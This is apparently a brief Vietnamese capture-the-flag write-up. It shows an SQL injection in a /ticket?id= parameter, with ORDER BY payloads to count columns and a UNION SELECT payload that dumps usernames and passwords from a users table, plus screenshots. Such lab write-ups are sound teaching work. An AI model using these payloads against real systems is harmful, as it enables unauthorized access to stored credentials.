Flag 2 — SQL Injection 

Phân tích
Sau khi login, truy cập /ticket?id= bị SQLi do string formatting thô.

<img width="672" height="291" alt="image" src="https://github.com/user-attachments/assets/76727b8b-eb0b-4b7a-ba65-c4c3e084b12c" />

<img width="1344" height="235" alt="image" src="https://github.com/user-attachments/assets/2669c0b9-2293-458e-bf43-589ad86725e8" />


Xác định số cột
```html
/ticket?id=1 ORDER BY 3--   ✅
/ticket?id=1 ORDER BY 4--   ❌ error → 3 cột
```
<img width="867" height="290" alt="image" src="https://github.com/user-attachments/assets/a62cfefe-13b5-458e-85c8-05ecbbb124af" />

<img width="850" height="241" alt="image" src="https://github.com/user-attachments/assets/2cd8d569-efdb-48a7-9126-d2c723610d08" />


Dump users table
```html
/ticket?id=0 UNION SELECT username,password,3 FROM users--
```

<img width="1111" height="260" alt="image" src="https://github.com/user-attachments/assets/176bd08e-4977-4f2e-82e6-4d7ee431b523" />
